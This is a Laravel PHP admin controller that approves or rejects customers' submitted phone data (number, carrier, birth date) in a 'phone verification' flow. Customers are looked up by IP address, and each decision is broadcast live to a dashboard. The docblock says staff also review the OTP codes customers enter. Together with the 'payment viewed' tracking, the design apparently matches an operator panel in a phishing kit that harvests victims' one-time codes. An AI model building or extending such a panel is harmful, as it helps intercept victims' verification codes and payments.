<?php

namespace App\Http\Controllers\Admin;

use App\Events\PhoneOtpApproved;
use App\Events\PhoneOtpRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Models\CustomerProfile;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

/**
 * Admin controller for the 2-stage non-STC phone verification flow.
 *
 * Stage 1 — phone-data-approve / phone-data-reject
 *   Admin reviews submitted phone data (phone number, carrier, birth date)
 *   before the customer receives an OTP.
 *
 * Stage 2 — phone-otp-approve / phone-otp-reject
 *   Admin reviews the OTP code the customer entered.
 *   (Handled by AdminPhoneVerificationController.)
 */
class AdminPhoneDataController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve phone data (stage 1) — allow OTP to be sent.
     */
    public function approve(Request $request): JsonResponse
    {
        $request->validate([
            'customer_ip' => 'required|string',
        ]);

        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();

        if (!$customer) {
            return response()->json([
                'success' => false,
                'message' => 'لم يتم العثور على العميل',
            ], 404);
        }

        $extra = $customer->extra_data ?? [];

        if (($extra['phone_data_status'] ?? null) === 'approved') {
            return response()->json([
                'success' => false,
                'message' => 'تمت الموافقة على بيانات الهاتف مسبقاً',
            ], 422);
        }

        $extra['phone_data_status'] = 'approved';
        $customer->update(['extra_data' => $extra]);

        try {
            broadcast(new PhoneOtpApproved($request->customer_ip))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (approvePhoneData): ' . $e->getMessage());
        }

        $this->notifyDashboard($request->customer_ip, 'phone_data_approved');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على بيانات الهاتف — بانتظار رمز التحقق',
        ]);
    }

    /**
     * Reject phone data (stage 1) — deny before OTP.
     */
    public function reject(Request $request): JsonResponse
    {
        $request->validate([
            'customer_ip' => 'required|string',
            'reason'       => 'nullable|string|max:500',
        ]);

        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();

        if (!$customer) {
            return response()->json([
                'success' => false,
                'message' => 'لم يتم العثور على العميل',
            ], 404);
        }

        $extra = $customer->extra_data ?? [];

        if (in_array($extra['phone_data_status'] ?? null, ['rejected'])) {
            return response()->json([
                'success' => false,
                'message' => 'تم رفض بيانات الهاتف مسبقاً',
            ], 422);
        }

        $extra['phone_data_status'] = 'rejected';
        if ($request->filled('reason')) {
            $extra['phone_data_rejection_reason'] = $request->reason;
        }
        $customer->update(['extra_data' => $extra]);

        try {
            broadcast(new PhoneOtpRejected($request->customer_ip, $request->reason))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (rejectPhoneData): ' . $e->getMessage());
        }

        $this->notifyDashboard($request->customer_ip, 'phone_data_rejected');
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض بيانات الهاتف',
        ]);
    }
}
